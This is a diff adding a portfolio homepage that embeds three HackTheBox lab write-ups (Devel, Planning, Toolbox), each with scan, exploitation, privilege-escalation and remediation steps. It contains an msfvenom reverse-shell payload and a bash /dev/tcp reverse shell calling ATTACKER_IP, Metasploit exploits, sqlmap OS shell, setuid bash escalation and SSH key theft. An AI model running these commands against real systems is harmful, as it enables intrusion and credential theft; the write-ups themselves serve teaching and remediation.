@@ -1,0 +1,520 @@
+---
+layout: default
+title: Welcome
+---
+<!-- Your original homepage content -->
+<div class="wip-banner-container">
+  <div class="chain-container">
+    <div class="chain chain-left"></div>
+    <div class="chain chain-right"></div>
+  </div>
+  <div class="wip-banner">
+    <i class="fas fa-tools"></i> 🚧 This site is a work-in-progress. Updates coming soon. 🚧 <i class="fas fa-tools"></i>
+  </div>
+</div>
+<h1 class="hero-heading">Welcome to My Cyber Playground</h1>
+<p class="hero-paragraph">
+  This is a temporary homepage while I build out my portfolio. Expect code, curiosity, and a few surprises. <a href="/about">Learn more about me</a>.
+</p>
+
+<!-- Writeups: cards + modal (no redirects, no fetches, no Markdown parsing) -->
+<style>
+/* minimal styles; namespaced to avoid conflicts with theme/default layout */
+.writeups-home {
+  --panel:#0f1a2e; --card:linear-gradient(180deg, rgba(255,255,255,.04), rgba(255,255,255,.02));
+  --border:rgba(255,255,255,.10); --muted:#a5bbdd; --accent:#5cc8ff;
+}
+.writeups-home .section-head{display:flex;align-items:end;justify-content:space-between;gap:1rem;margin:1.5rem 0 1rem}
+.writeups-home h2{margin:0;font-size:1.35rem}
+.writeups-home .section-sub{color:var(--muted);font-size:.95rem}
+.writeups-home .badge{display:inline-block;font-size:.75rem;padding:.15rem .5rem;border-radius:999px;border:1px solid var(--border);color:var(--muted)}
+.writeups-home .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:1rem}
+.writeups-home .card{
+  background:var(--card);border:1px solid var(--border);border-radius:14px;padding:1rem 1rem 1.1rem;
+  box-shadow:0 16px 40px rgba(0,0,0,.18);cursor:pointer;transition:transform .16s ease,border-color .2s ease
+}
+.writeups-home .card:hover{transform:translateY(-6px);border-color:rgba(92,200,255,.35)}
+.writeups-home .card h3{margin:.25rem 0 .35rem;font-size:1.05rem}
+.writeups-home .card p{margin:0;color:var(--muted);font-size:.95rem}
+
+/* Modal */
+.writeups-home .modal{position:fixed;inset:0;display:none;align-items:center;justify-content:center;padding:1rem;
+  background:rgba(2,10,30,.6);backdrop-filter: blur(2px);z-index:9999}
+.writeups-home .modal.open{display:flex}
+.writeups-home .modal-content{position:relative;width:100%;max-width:980px;height:84vh;background:var(--panel);
+  border:1px solid var(--border);border-radius:12px;overflow:auto;box-shadow:0 16px 40px rgba(0,0,0,.35)}
+.writeups-home .modal-head{display:flex;align-items:center;justify-content:space-between;padding:.6rem .9rem;
+  position:sticky;top:0;background:rgba(15,26,46,.9);border-bottom:1px solid var(--border)}
+.writeups-home .modal-title{font-weight:600;font-size:1rem}
+.writeups-home .modal-close{appearance:none;border:1px solid var(--border);background:transparent;color:inherit;
+  padding:.35rem .6rem;border-radius:8px;cursor:pointer}
+.writeups-home .doc{padding:1rem .9rem 2rem}
+.writeups-home .doc h1,.writeups-home .doc h2,.writeups-home .doc h3{scroll-margin-top:72px}
+.writeups-home .doc pre{background:#0a1326;padding:.75rem;border-radius:8px;overflow:auto;border:1px solid var(--border)}
+.writeups-home .doc code{background:#0a1326;padding:.15rem .35rem;border-radius:6px}
+.writeups-home .doc a{color:var(--accent);text-decoration:none}
+.writeups-home .doc a:hover{text-decoration:underline}
+.writeups-home .doc ul,.writeups-home .doc ol{padding-left:1.2rem}
+.writeups-home hr{border:none;border-top:1px solid var(--border);margin:1.2rem 0}
+
+/* Hide the pre-rendered content containers */
+.writeups-home .template{display:none}
+
+/* Quick polish for your banner/hero so it fits the theme */
+.wip-banner-container{position:relative;margin:.5rem 0 1rem}
+.wip-banner{background:#17223b;border:1px solid rgba(255,255,255,.08);padding:.6rem .8rem;border-radius:10px;text-align:center}
+.chain-container{position:absolute;top:-10px;left:0;right:0;height:10px;pointer-events:none}
+.chain{position:absolute;width:30%;height:2px;background:linear-gradient(90deg,#97b3e6,#5cc8ff);opacity:.5}
+.chain-left{left:5%} .chain-right{right:5%}
+.hero-heading{margin:.8rem 0 .3rem;font-size:1.6rem}
+.hero-paragraph{color:#a5bbdd;max-width:70ch}
+</style>
+
+<section class="writeups-home">
+  <div class="section-head">
+    <div>
+      <h2>Selected Security Lab Writeups</h2>
+      <div class="section-sub">Click a card to read the report in a modal — no navigation, no external fetches.</div>
+    </div>
+    <div class="badge">Static • Pre-rendered HTML</div>
+  </div>
+
+  <div class="grid">
+    <div class="card" data-target="#doc-devel" data-title="Devel — Anonymous FTP → SYSTEM">
+      <h3>Devel — Anonymous FTP → SYSTEM</h3>
+      <p>Anonymous FTP → ASPX webshell → Meterpreter → local exploit → SYSTEM</p>
+    </div>
+    <div class="card" data-target="#doc-planning" data-title="Planning — Grafana RCE → Root">
+      <h3>Planning — Grafana RCE → Root</h3>
+      <p>Grafana SQL-expression RCE → container foothold → cron escalation to root</p>
+    </div>
+    <div class="card" data-target="#doc-toolbox" data-title="Toolbox — SQLi → Administrator">
+      <h3>Toolbox — SQLi → Administrator</h3>
+      <p>Postgres SQLi → OS shell → Docker pivot → Administrator private key</p>
+    </div>
+  </div>
+
+  <!-- Modal viewer -->
+  <div id="modal" class="modal" aria-modal="true">
+    <div class="modal-content">
+      <div class="modal-head">
+        <div id="modalTitle" class="modal-title">Loading…</div>
+        <button id="closeBtn" class="modal-close">Close ✕</button>
+      </div>
+      <div id="doc" class="doc">Loading…</div>
+    </div>
+  </div>
+
+  <!-- Inlined, pre-rendered HTML content (FULL writeups) -->
+  <div id="doc-devel" class="template">
+    <article>
+      <h1>Devel — Anonymous FTP → ASPX webshell → Meterpreter → Local exploit → SYSTEM (Lab)</h1>
+      <p><strong>Date:</strong> 2025-10-19</p>
+      <hr>
+      <h2>TL;DR</h2>
+      <p>Anonymous FTP allowed uploading an ASPX webshell. I uploaded a Meterpreter ASPX payload and triggered it via HTTP to get a Meterpreter session. After enumerating the host and running a local exploit suggester, I used a 32-bit local exploit to escalate to <strong>NT AUTHORITY\SYSTEM</strong>. All testing was performed on a retired HackTheBox lab VM in an isolated environment. PoC artifacts in this writeup are sanitized.</p>
+      <hr>
+      <h2>Scope &amp; permission</h2>
+      <p>This work was performed on a <strong>retired HackTheBox machine</strong> in a lab I control. All commands and artifacts in this document are sanitized for public release. <strong>Do not run exploit code against third-party or production systems.</strong></p>
+      <hr>
+      <h2>Environment (sanitized)</h2>
+      <ul>
+        <li><strong>Target:</strong> <code>TARGET_IP</code> (devel)</li>
+        <li><strong>Discovered services:</strong>
+          <ul>
+            <li>FTP — anonymous allowed (Microsoft ftpd)</li>
+            <li>HTTP — Microsoft IIS 7.5 (IIS7)</li>
+          </ul>
+        </li>
+        <li><strong>OS:</strong> Windows (32-bit / x86) — determined from Meterpreter <code>sysinfo</code>.</li>
+      </ul>
+      <hr>
+      <h2>Tools used</h2>
+      <p><code>nmap</code>, <code>ftp</code> (or any FTP client), <code>msfvenom</code> (payload generation), <code>msfconsole</code> (multi/handler &amp; local exploit), a web browser / <code>curl</code> to trigger the uploaded webshell, <code>netstat</code>/<code>ss</code>, Meterpreter post modules (<code>local_exploit_suggester</code>), and common shell utilities.</p>
+      <blockquote>All steps were performed in an isolated lab.</blockquote>
+      <hr>
+      <h2>Chain summary (short)</h2>
+      <ol>
+        <li>Port scan → anonymous FTP discovered.</li>
+        <li>Upload ASPX payload (Meterpreter) via anonymous FTP.</li>
+        <li>Trigger the ASPX payload through IIS to get a Meterpreter session.</li>
+        <li>Use Meterpreter to enumerate and confirm x86 (32-bit) target.</li>
+        <li>Run <code>post/multi/recon/local_exploit_suggester</code> to find suitable local exploits.</li>
+        <li>Launch a 32-bit local exploit (lab-only) to spawn a SYSTEM session.</li>
+      </ol>
+      <hr>
+      <h2>Detailed, reproducible (sanitized) steps</h2>
+      <h3>1) Initial scan</h3>
+      <pre><code>nmap -sCV -T4 --open -oA recon --stats-every 5s TARGET_IP</code></pre>
+      <p><strong>Observed (sanitized):</strong></p>
+      <ul>
+        <li>FTP (21) — Microsoft ftpd — anonymous FTP login allowed</li>
+        <li>HTTP (80) — Microsoft-IIS/7.5 (IIS7)</li>
+      </ul>
+      <h3>2) Confirm anonymous FTP and list files</h3>
+      <pre><code>ftp TARGET_IP
+username: anonymous
+password: (blank)
+ls</code></pre>
+      <p>Noted <code>aspnet_client/</code> (empty), <code>iisstart.htm</code>, and <code>welcome.png</code>. Nothing immediately interesting in the pages, but <strong>anonymous write/upload was possible</strong>.</p>
+      <h3>3) Generate an ASPX Meterpreter payload (lab-only)</h3>
+      <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=LPORT -f aspx > devel.aspx</code></pre>
+      <p><strong>Note:</strong> On restricted networks, ports <code>&lt;1024</code> may require privileges — choose a port you can receive on.</p>
+      <h3>4) Upload the ASPX to the webroot via anonymous FTP</h3>
+      <pre><code>ftp TARGET_IP
+login as anonymous
+put devel.aspx
+# confirm file is present (e.g., in IIS webroot)</code></pre>
+      <p>If the FTP root maps to the IIS webroot, the uploaded <code>devel.aspx</code> becomes web-accessible (for example: <code>http://TARGET_IP/devel.aspx</code>).</p>
+      <h3>5) Set up a handler and trigger the webshell</h3>
+      <pre><code># in msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST ATTACKER_IP
+set LPORT LPORT
+set ExitOnSession false
+exploit -j</code></pre>
+      <p>Trigger the webshell by browsing to the uploaded ASPX (or <code>curl http://TARGET_IP/devel.aspx</code>) — this should call back to your handler and create a Meterpreter session.</p>
+      <h3>6) Interact with the Meterpreter session</h3>
+      <pre><code># in msfconsole
+sessions -i &lt;id&gt;
+# at meterpreter prompt
+sysinfo   # confirm OS and architecture (Observed x86)
+pwd       # observed C:\Windows\system32\inetsrv</code></pre>
+      <p>From this session, <code>sysinfo</code> reported <strong>32-bit (x86)</strong> and the current working directory was <code>C:\Windows\System32\inetsrv</code>. Ensure local exploit choices match the discovered architecture.</p>
+      <h3>7) Upload / move to writable folders (if needed)</h3>
+      <p>The web context often allows writing to <code>C:\Windows\Temp</code> or other temp locations. Use such a path to stage additional binaries or exploits as required.</p>
+      <h3>8) Enumerate and suggest local exploits</h3>
+      <pre><code>run post/multi/recon/local_exploit_suggester</code></pre>
+      <p>This returns a prioritized list of local exploits that may work on the target given OS/patch level/architecture.</p>
+      <h3>9) Launch a 32-bit local exploit (lab-only)</h3>
+      <pre><code># in msfconsole
+use exploit/windows/local/ms10_015_kitrap0d
+set SESSION &lt;meterpreter-session-id&gt;
+set LHOST ATTACKER_IP
+set LPORT LPORT
+set PAYLOAD windows/meterpreter/reverse_tcp
+exploit -j</code></pre>
+      <p>The exploit succeeded and a new background session with <strong>SYSTEM</strong> privileges was created.</p>
+      <p><strong>Important:</strong> choose a local exploit appropriate to the discovered OS, arch, and patch level.</p>
+      <h3>10) Verify SYSTEM and capture flags</h3>
+      <pre><code># switch to the new session
+sessions -i &lt;new-session-id&gt;
+getuid  # shows NT AUTHORITY\SYSTEM
+# retrieve flags
+cd C:\Users\&lt;user&gt;\Desktop
+type user.txt
+cd C:\Users\Administrator\Desktop
+type root.txt</code></pre>
+      <hr>
+      <h2>Impact</h2>
+      <p>Full host compromise: anonymous FTP + writable webroot allowed remote payload upload → web-executable payload → remote shell → local exploit → SYSTEM.</p>
+      <p>On real systems this chain would allow attackers to exfiltrate sensitive data, create persistence, and move laterally.</p>
+      <hr>
+      <h2>Vulnerabilities &amp; references</h2>
+      <ul>
+        <li><strong>MS10-015</strong> — Microsoft Security Bulletin (Windows kernel vulnerabilities). See Microsoft advisory.</li>
+        <li><strong>CVE-2010-0232</strong> — “Windows Kernel Exception Handler Vulnerability” (KiTrap0D). See NVD.</li>
+        <li><strong>CVE-2010-0233</strong> — related Windows kernel elevation-of-privilege issue addressed in MS10-015 (see the bulletin/CVE records).</li>
+        <li><strong>Exploit references / modules:</strong>
+          <ul>
+            <li>Metasploit module <code>exploit/windows/local/ms10_015_kitrap0d</code> (module description and usage)</li>
+            <li>Public exploit writeups (KiTrap0D / kitrap0d)</li>
+          </ul>
+        </li>
+      </ul>
+      <blockquote>In this writeup I used the 32-bit <code>ms10_015_kitrap0d</code> module (kitrap0d) against an x86 target to obtain a SYSTEM session. Choose an exploit that matches the target architecture and patch level.</blockquote>
+      <hr>
+      <h2>Remediation (prioritized)</h2>
+      <ol>
+        <li><strong>Disable anonymous FTP</strong> or restrict it to an isolated, non-webroot directory.</li>
+        <li><strong>Harden IIS/FTP mapping:</strong> deny execute permission on upload directories; store uploads outside the web-executable tree.</li>
+        <li><strong>Patch Windows and apply vendor fixes.</strong></li>
+        <li><strong>Least privilege &amp; segmentation.</strong></li>
+        <li><strong>Monitoring &amp; alerting.</strong></li>
+        <li><strong>File integrity &amp; upload validation.</strong></li>
+      </ol>
+      <hr>
+      <h2>Appendix / Notes</h2>
+      <ul>
+        <li>All artifacts and commands in this document are <strong>sanitized</strong> for public release and were executed in an isolated, controlled lab environment.</li>
+        <li>This writeup documents a common yet preventable attack chain; it is presented for defensive awareness and remediation guidance only.</li>
+      </ul>
+    </article>
+  </div>
+
+  <div id="doc-planning" class="template">
+    <article>
+      <h1>Planning — Grafana RCE → Container Foothold → Root via Cron (Lab)</h1>
+      <p><strong>Date:</strong> 2025-10-16</p>
+      <hr>
+      <h2>TL;DR</h2>
+      <p>Discovered a Grafana virtual host (<code>grafana.planning.htb</code>) via host-header fuzzing. Using lab-provided Grafana credentials and an in-lab Grafana SQL-expression RCE PoC, I obtained a shell inside the Grafana container, recovered internal credentials and a cron/backup password, used those credentials to reach an internal admin UI on <code>127.0.0.1:8000</code> (via SSH port-forward), and escalated to <strong>root</strong> by abusing a cron job that executed web-writable content. All actions were performed on a retired HackTheBox VM in an isolated lab. PoC artifacts are sanitized.</p>
+      <hr>
+      <h2>Scope &amp; permission</h2>
+      <p>This work was performed on a <strong>retired HackTheBox machine</strong> in a lab I control. All commands and artifacts in this document are sanitized for public release. <strong>Do not run exploit code against third-party or production systems.</strong></p>
+      <hr>
+      <h2>Environment &amp; notable findings</h2>
+      <ul>
+        <li><strong>Target:</strong> <code>TARGET_IP</code> (<code>planning.htb</code>) — lab IP used during testing</li>
+        <li><strong>Services discovered (sanitized):</strong>
+          <ul>
+            <li>SSH — OpenSSH 9.6p1 (port 22)</li>
+            <li>HTTP — nginx 1.24.0 (port 80)</li>
+            <li>Grafana web UI at <code>grafana.planning.htb</code> (Grafana v11.0.0)</li>
+            <li>Internal services bound to <code>127.0.0.1</code> inside the host/container: <code>8000</code>, <code>3000</code>, <code>3306</code>, etc.</li>
+          </ul>
+        </li>
+        <li><strong>Container evidence:</strong> environment <code>HOSTNAME</code> appeared to be a container ID</li>
+      </ul>
+      <hr>
+      <h2>Tools used</h2>
+      <p><code>nmap</code>, <code>ffuf</code>, web browser, <code>nc</code> (listener), and standard SSH/shell utilities. The Grafana SQL-expression RCE PoC was executed in-lab and is not published here; all exploit steps were performed in an isolated testing environment.</p>
+      <hr>
+      <h2>Chain summary (short)</h2>
+      <ol>
+        <li><code>nmap</code> → discovered HTTP (nginx) and host <code>planning.htb</code>.</li>
+        <li>Host-header fuzzing with <code>ffuf</code> → discovered <code>grafana.planning.htb</code>.</li>
+        <li>Add <code>/etc/hosts</code> entry → open the Grafana web UI.</li>
+        <li>Login to Grafana (lab credentials) → identified Grafana v11.0.0.</li>
+        <li>Execute in-lab Grafana SQL-expression RCE PoC → interactive shell inside the Grafana container.</li>
+        <li><code>env</code> revealed <code>GF_SECURITY_ADMIN_USER</code> and <code>GF_SECURITY_ADMIN_PASSWORD</code>.</li>
+        <li>SSH to host as recovered user (<code>enzo</code>) → captured <code>user.txt</code>.</li>
+        <li><code>netstat</code>/<code>ss</code> → internal services on <code>127.0.0.1:8000</code> (admin UI).</li>
+        <li>SSH local port-forward (<code>ssh -L 8000:127.0.0.1:8000 enzo@TARGET</code>) → access internal admin UI locally.</li>
+        <li>Found <code>crontab.db</code> → backup job with an <code>@daily</code> schedule and a backup password.</li>
+        <li>Authenticate to internal UI with backup/root credential → obtain admin access.</li>
+        <li>Abuse cron/web-writable input (lab) → <code>chmod u+s /bin/bash</code> → <code>bash -p</code> → root and <code>root.txt</code>.</li>
+      </ol>
+      <hr>
+      <h2>Detailed, reproducible (sanitized) steps</h2>
+      <h3>1) Port scan</h3>
+      <pre><code>nmap -sCV -T4 --open --stats-every 5s -oA recon TARGET_IP</code></pre>
+      <p><strong>Observed:</strong> open ports <code>22</code> (SSH) and <code>80</code> (HTTP). The HTTP response indicated <code>planning.htb</code> as the host.</p>
+      <h3>2) Add initial host mapping (resolve <code>planning.htb</code> locally)</h3>
+      <pre><code>echo "TARGET_IP planning.htb" | sudo tee -a /etc/hosts</code></pre>
+      <p>This allows opening <code>http://planning.htb</code> from your browser.</p>
+      <h3>3) Virtual-host discovery — found <code>grafana.planning.htb</code></h3>
+      <p>Host-header fuzzing with <code>ffuf</code>, filtering noise and identical responses; the run produced <code>grafana.planning.htb</code>:</p>
+      <pre><code>ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
+     -H 'Host: FUZZ.planning.htb' \
+     -u http://planning.htb -c -fs 178</code></pre>
+      <p>Then add it to <code>/etc/hosts</code>:</p>
+      <pre><code>echo "TARGET_IP grafana.planning.htb" | sudo tee -a /etc/hosts</code></pre>
+      <p>Now <code>http://grafana.planning.htb</code> is reachable.</p>
+      <h3>4) Access Grafana &amp; identify version</h3>
+      <p>Opened <code>http://grafana.planning.htb</code> and observed the login page. Version reported: <strong>Grafana v11.0.0</strong>.</p>
+      <h3>5) Login with provided/lab credentials</h3>
+      <ul>
+        <li><strong>Username:</strong> <code>admin</code></li>
+        <li><strong>Password:</strong> <code>&lt;GRAFANA_ADMIN_PASS&gt;</code> (redacted)</li>
+      </ul>
+      <h3>6) Researched vulnerability (high level)</h3>
+      <p>From the version, I located an in-lab PoC for a Grafana SQL-expression RCE. I executed the PoC in-lab while a local listener awaited the reverse shell.</p>
+      <h3>7) Obtained shell in Grafana container</h3>
+      <p>The PoC produced an interactive shell inside the Grafana container. Within that shell:</p>
+      <ul>
+        <li><code>pwd</code> → <code>/usr/share/grafana</code></li>
+        <li><code>env</code> → <code>HOSTNAME=7ce659d667d7</code>, <code>GF_SECURITY_ADMIN_USER=enzo</code>, <code>GF_SECURITY_ADMIN_PASSWORD=&lt;REDACTED&gt;</code></li>
+      </ul>
+      <h3>8) Test SSH access with recovered credentials</h3>
+      <pre><code>ssh enzo@TARGET_IP
+# password: &lt;REDACTED_GRAFANA_ENV_PASS&gt;</code></pre>
+      <p>Authentication succeeded; retrieved <code>user.txt</code>.</p>
+      <h3>9) Enumerated local services</h3>
+      <pre><code>netstat -tulnp</code></pre>
+      <p>Sanitized/listening summary:</p>
+      <ul>
+        <li><code>127.0.0.1:8000</code> — LISTEN</li>
+        <li><code>127.0.0.1:3000</code> — LISTEN</li>
+        <li><code>127.0.0.1:3306</code> — LISTEN</li>
+        <li><code>127.0.0.1:40193</code> — LISTEN</li>
+        <li><code>127.0.0.1:33060</code> — LISTEN</li>
+        <li><code>0.0.0.0:80</code> — LISTEN</li>
+        <li><code>:::22</code> — LISTEN</li>
+      </ul>
+      <p>The notable internal-only web service was on <code>127.0.0.1:8000</code>.</p>
+      <h3>10) Port-forward to access internal admin</h3>
+      <pre><code>ssh -L 8000:127.0.0.1:8000 enzo@TARGET_IP
+# then open http://127.0.0.1:8000 locally</code></pre>
+      <p>The internal UI was reachable locally. Obvious credentials initially failed.</p>
+      <h3>11) Found cron/backup configuration (<code>crontab.db</code>)</h3>
+      <ul>
+        <li>Backup job “Grafana backup”</li>
+        <li>Schedule: <code>@daily</code></li>
+        <li>Password used by backup process: <code>&lt;BACKUP_PASSWORD_REDACTED&gt;</code></li>
+        <li>Cleanup script invoked from root directory</li>
+      </ul>
+      <p>This indicated the backup/cron job ran with root privileges and relied on a password recoverable from configuration.</p>
+      <h3>12) Use backup/root credentials to access internal admin</h3>
+      <p>Using the backup credential, authenticated to the internal admin UI and obtained administrative access.</p>
+      <h3>13) Achieve full root via setuid / cron technique (lab-only)</h3>
+      <pre><code># setuid on /bin/bash (lab environment only)
+chmod u+s /bin/bash
+ls -l /bin/bash  # -rwsr-xr-x root root /bin/bash
+bash -p          # effective root</code></pre>
+      <p>Accessed <code>/root/root.txt</code> to confirm root.</p>
+      <blockquote><strong>Important:</strong> setting the setuid bit on system binaries is destructive/dangerous and must never be done on production systems.</blockquote>
+      <hr>
+      <h2>Impact</h2>
+      <p>Remote admin compromise (Grafana) → container shell → internal config &amp; credentials → internal admin → cron abuse → root.</p>
+      <hr>
+      <h2>Remediation (prioritized)</h2>
+      <ol>
+        <li><strong>Patch Grafana</strong> promptly.</li>
+        <li><strong>Avoid embedding secrets</strong> in dashboards/env; restrict access.</li>
+        <li><strong>Harden cron/backup</strong>: root-owned, not web-writable; strict permissions.</li>
+        <li><strong>Limit container privileges</strong>; avoid sensitive mounts.</li>
+        <li><strong>Log &amp; alert</strong> on cron/setuid changes and suspicious admin access.</li>
+        <li><strong>Network segmentation</strong> for internal admin UIs.</li>
+      </ol>
+      <hr>
+      <h2>Appendix / Notes</h2>
+      <ul>
+        <li>All artifacts and commands are <strong>sanitized</strong> and were executed in an isolated lab environment.</li>
+        <li>Presented for defensive awareness and remediation guidance only.</li>
+      </ul>
+    </article>
+  </div>
+
+  <div id="doc-toolbox" class="template">
+    <article>
+      <h1>Toolbox — SQLi → OS Shell (Postgres) → Container Pivot → Host SSH → Administrator Key → Administrator (Lab)</h1>
+      <p><strong>Date:</strong> 2025-10-19</p>
+      <hr>
+      <h2>TL;DR</h2>
+      <p>Anonymous FTP revealed a <code>docker-toolbox.exe</code> artifact and the site <code>admin.megalogistic.com</code>. I captured the admin login request, used <code>sqlmap</code> to exploit a PostgreSQL SQL injection and obtain an OS shell, gained a shell on the container, discovered the user flag under the Postgres directories, pivoted to the host via <code>docker:tcuser</code> SSH creds (container gateway), recovered Administrator’s private SSH key from <code>C:\Users\Administrator\.ssh\id_rsa</code>, and used that key to SSH in as <code>Administrator</code>. All testing was performed on a retired HTB VM in an isolated lab; artifacts are sanitized.</p>
+      <hr>
+      <h2>Scope &amp; permission</h2>
+      <p>This assessment was performed on a <strong>retired HackTheBox machine</strong> in a lab I control. All commands, artifacts and outputs in this public writeup are sanitized. Do not run exploit code or use recovered keys against third-party or production systems.</p>
+      <hr>
+      <h2>Environment &amp; notable findings</h2>
+      <ul>
+        <li><strong>Target:</strong> <code>TARGET_IP</code> (certificate CN: <code>admin.megalogistic.com</code>)</li>
+        <li><strong>Services discovered:</strong>
+          <ul>
+            <li>FTP (21) — FileZilla ftpd — anonymous FTP allowed (file <code>docker-toolbox.exe</code> present)</li>
+            <li>HTTPS (443) — Apache/2.4.38 (Debian) — site <code>admin.megalogistic.com</code></li>
+            <li>Windows services (SSH for Windows, SMB/RPC ports, WinRM-ish ports)</li>
+          </ul>
+        </li>
+        <li><strong>Container evidence:</strong> FTP artifact (<code>docker-toolbox.exe</code>) and container IPs observed from shells.</li>
+      </ul>
+      <hr>
+      <h2>Tools used</h2>
+      <p><code>nmap</code>, <code>ftp</code> / FTP client, browser + Burp (to capture login POST), <code>sqlmap</code>, <code>nc</code> (netcat), basic shell utils (<code>python3 -c</code>, <code>pty</code>), <code>ssh</code>. (Private keys and unredacted logs are kept offline.)</p>
+      <hr>
+      <h2>Short chain summary</h2>
+      <ol>
+        <li><code>nmap</code> → anonymous FTP with <code>docker-toolbox.exe</code>.</li>
+        <li>Map host to <code>admin.megalogistic.com</code> → capture login POST.</li>
+        <li><code>sqlmap</code> → confirm PostgreSQL SQLi; enumerate <code>public.users</code>, found hashed admin password.</li>
+        <li><code>sqlmap --os-shell</code> → spawn OS shell; reverse shell to attacker.</li>
+        <li>Interactive PTY; find user flag under Postgres directories.</li>
+        <li>Container networking observed (<code>CONTAINER_IP</code> ~ <code>172.17.0.2</code>, host at <code>172.17.0.1</code>).</li>
+        <li>SSH to host as <code>docker</code> using known <code>docker-toolbox</code> creds (<code>docker:tcuser</code>).</li>
+        <li>Found <code>C:\Users\Administrator\.ssh\id_rsa</code>; copied key to attacker.</li>
+        <li><code>ssh -i id_rsa administrator@TARGET_IP</code> → Administrator access; retrieved <code>root.txt</code>.</li>
+      </ol>
+      <hr>
+      <h2>Detailed steps (sanitized, reproducible)</h2>
+      <h3>1) Port scan</h3>
+      <pre><code>nmap -p- -sCV -T4 --open -oA recon --stats-every 5s TARGET_IP</code></pre>
+      <p>Scan revealed FTP (anonymous allowed), HTTPS (Apache), and Windows ports — an indicator of mixed/virtualized environment.</p>
+      <h3>2) Anonymous FTP &amp; artifact discovery</h3>
+      <pre><code>ftp TARGET_IP
+# login: anonymous
+# password: (blank)
+ls -la</code></pre>
+      <p><strong>Found:</strong> <code>docker-toolbox.exe</code> in the FTP root — a hint at Docker/tooling presence and a pivot opportunity.</p>
+      <h3>3) Map hostname for browsing &amp; capture login</h3>
+      <pre><code>echo "TARGET_IP admin.megalogistic.com" | sudo tee -a /etc/hosts
+# Use browser+Burp to capture the admin login POST and save as login.req</code></pre>
+      <h3>4) SQLi discovery &amp; enum with sqlmap</h3>
+      <pre><code>sqlmap -r login.req --batch --dbs -o
+
+# Enumerate &amp; dump
+sqlmap -r login.req -D public --tables --batch
+sqlmap -r login.req -D public -T users --dump --batch</code></pre>
+      <p>Result: <code>users</code> table had one row: <code>username = admin</code>, <code>password = &lt;hashed&gt;</code>.</p>
+      <h3>5) sqlmap OS shell → reverse shell (lab-only)</h3>
+      <pre><code># On attacker:
+nc -lvnp LPORT
+
+# From sqlmap's OS shell:
+bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/LPORT 0>&1'
+
+# After connection:
+python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+      <p>Result: interactive shell on the database/container host.</p>
+      <h3>6) Locate user flag &amp; observe container network</h3>
+      <pre><code>cd /var/lib/postgresql
+ls -la
+cat user.txt
+
+ifconfig || ip a
+# saw container IP (e.g., 172.17.0.2) and gateway 172.17.0.1</code></pre>
+      <h3>7) Pivot to host via known docker-toolbox creds</h3>
+      <pre><code>ssh docker@172.17.0.1
+# password: tcuser</code></pre>
+      <p>Provided SSH access to the host VM as <code>docker</code>. Inspect Windows user folders:</p>
+      <pre><code>ls /c/Users
+ls /c/Users/Administrator/.ssh
+# found id_rsa</code></pre>
+      <h3>8) Retrieve Administrator private key &amp; use it (lab-only)</h3>
+      <pre><code># Copy id_rsa securely to attacker
+chmod 600 id_rsa
+ssh -i id_rsa administrator@TARGET_IP</code></pre>
+      <p>Authenticated as Administrator; retrieved <code>root.txt</code> from <code>C:\Users\Administrator\Desktop</code>.</p>
+      <hr>
+      <h2>Impact</h2>
+      <p>Full host compromise: SQLi → OS command execution on DB/container → pivot to host → discovery and reuse of Administrator private key → Administrator remote access.</p>
+      <hr>
+      <h2>Remediation (prioritized)</h2>
+      <ol>
+        <li><strong>Fix SQL injection:</strong> parameterized queries / prepared statements; disable stacked queries.</li>
+        <li><strong>Disable anonymous FTP</strong> or restrict it; remove sensitive artifacts like <code>docker-toolbox.exe</code>.</li>
+        <li><strong>Key management:</strong> avoid storing keys in user dirs; rotate compromised keys.</li>
+        <li><strong>Segregate containers from host management</strong>; enforce network segmentation.</li>
+        <li><strong>Harden SSH &amp; key permissions</strong>; log/alert on new SSH keys or Administrator key usage.</li>
+        <li><strong>Monitor uploads &amp; DB anomalies</strong>; alert on unexpected file writes or SQL error patterns.</li>
+      </ol>
+      <hr>
+      <h2>Appendix / Notes</h2>
+      <ul>
+        <li>All artifacts and commands are <strong>sanitized</strong> and were executed in an isolated lab environment.</li>
+        <li>This writeup is intended for defensive awareness and remediation guidance only.</li>
+      </ul>
+    </article>
+  </div>
+</section>
+
+<script>
+/* Tiny modal controller; no external libs */
+(function(){
+  const wrap = document.querySelector('.writeups-home');
+  if (!wrap) return;
+  const cards = wrap.querySelectorAll('.card');
+  const modal = wrap.querySelector('#modal');
+  const doc = wrap.querySelector('#doc');
+  const titleEl = wrap.querySelector('#modalTitle');
+  const closeBtn = wrap.querySelector('#closeBtn');
+
+  function openDoc(sel, title){
+    const src = wrap.querySelector(sel);
+    if(!src) return;
+    titleEl.textContent = title || 'Document';
+    doc.innerHTML = src.innerHTML; // already in DOM, pre-rendered
+    modal.classList.add('open');
+    modal.scrollTop = 0;
+  }
+  function closeModal(){ modal.classList.remove('open'); }
+
+  cards.forEach(card=>{
+    card.addEventListener('click', ()=> openDoc(card.getAttribute('data-target'), card.getAttribute('data-title')));
+  });
+  closeBtn.addEventListener('click', closeModal);
+  modal.addEventListener('click', (e)=>{ if(e.target === modal) closeModal(); });
+  document.addEventListener('keydown', (e)=>{ if(e.key === 'Escape') closeModal(); });
+})();
+</script>
